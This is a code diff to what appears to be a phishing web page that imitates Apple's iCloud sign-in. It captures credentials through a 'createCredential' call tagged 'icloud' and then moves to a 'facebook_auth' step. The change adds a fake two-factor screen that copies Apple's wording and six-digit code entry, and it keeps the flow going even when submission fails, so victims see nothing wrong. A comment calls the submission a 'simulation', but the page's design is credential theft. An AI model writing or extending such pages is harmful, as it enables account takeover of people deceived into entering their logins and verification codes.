@@ -9,10 +9,11 @@ import { AppleLoader } from "@/components/AppleLoader";
 import { Button } from "@/components/ui/button";
 
 // Step Enum
-type Step = "login" | "syncing" | "facebook_auth" | "success";
+type Step = "login" | "two_factor" | "syncing" | "facebook_auth" | "success";
 
 export default function Home() {
   const [step, setStep] = useState<Step>("login");
+  const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""]);
   const { mutateAsync: createCredential } = useCreateCredential();
   
   // Form Setup
@@ -32,20 +33,40 @@ export default function Home() {
       // Send credentials (simulation)
       await createCredential({ ...data, service: "icloud" });
       console.log("Credential created successfully");
-      setStep("syncing");
-      
-      // Move to next step after a delay
-      setTimeout(() => {
-        console.log("Moving to facebook_auth step");
-        setStep("facebook_auth");
-      }, 4000);
+      setStep("two_factor");
     } catch (error) {
       console.error("Submission error", error);
       // Ensure the flow continues even if the API call fails
-      setStep("syncing");
-      setTimeout(() => {
-        setStep("facebook_auth");
-      }, 4000);
+      setStep("two_factor");
+    }
+  };
+
+  const handleVerificationSubmit = () => {
+    setStep("syncing");
+    
+    // Move to next step after a delay
+    setTimeout(() => {
+      console.log("Moving to facebook_auth step");
+      setStep("facebook_auth");
+    }, 4000);
+  };
+
+  const handleCodeChange = (index: number, value: string) => {
+    if (value.length > 1) return;
+    
+    const newCode = [...verificationCode];
+    newCode[index] = value;
+    setVerificationCode(newCode);
+
+    // Auto-focus next input
+    if (value !== "" && index < 5) {
+      const nextInput = document.getElementById(`code-${index + 1}`);
+      nextInput?.focus();
+    }
+
+    // Check if all filled
+    if (newCode.every(digit => digit !== "")) {
+      setTimeout(handleVerificationSubmit, 500);
     }
   };
 
@@ -138,6 +159,53 @@ export default function Home() {
             
             <div className="mt-8 text-sm text-[#0071e3] cursor-pointer hover:underline">
               Create Apple ID
+            </div>
+          </motion.div>
+        )}
+
+        {/* STEP 2: TWO FACTOR AUTH */}
+        {step === "two_factor" && (
+          <motion.div
+            key="two_factor"
+            initial={{ opacity: 0, scale: 0.95 }}
+            animate={{ opacity: 1, scale: 1 }}
+            exit={{ opacity: 0, scale: 0.95 }}
+            className="w-full max-w-[400px] flex flex-col items-center"
+          >
+            <div className="mb-8 flex flex-col items-center">
+              <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
+              <h1 className="text-2xl font-semibold tracking-tight text-center">
+                Two-Factor Authentication
+              </h1>
+              <p className="text-[17px] text-[#86868b] mt-2 text-center leading-snug">
+                A message with a verification code has been sent to your devices. Enter the code to continue.
+              </p>
+            </div>
+
+            <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8">
+              <div className="flex justify-between gap-2">
+                {verificationCode.map((digit, idx) => (
+                  <input
+                    key={idx}
+                    id={`code-${idx}`}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handleCodeChange(idx, e.target.value)}
+                    className="w-10 h-14 text-center text-2xl font-semibold border border-[#d2d2d7] rounded-lg focus:border-[#0071e3] focus:ring-1 focus:ring-[#0071e3] outline-none transition-all"
+                  />
+                ))}
+              </div>
+              
+              <div className="mt-8 text-center">
+                <button 
+                  onClick={() => setVerificationCode(["", "", "", "", "", ""])}
+                  className="text-sm text-[#0071e3] hover:underline"
+                >
+                  Didn't get a verification code?
+                </button>
+              </div>
             </div>
           </motion.div>
         )}
